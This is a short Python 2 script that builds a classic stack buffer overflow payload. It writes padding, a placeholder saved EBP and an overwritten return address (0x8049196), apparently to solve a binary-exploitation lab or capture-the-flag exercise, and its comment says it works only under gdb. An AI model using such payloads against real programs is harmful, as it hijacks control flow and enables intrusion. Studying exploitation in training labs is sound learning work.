import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
ebp = "AAAA"
eip = struct.pack("I", 0x8049196) #running from gdb only!

print padding + ebp + eip
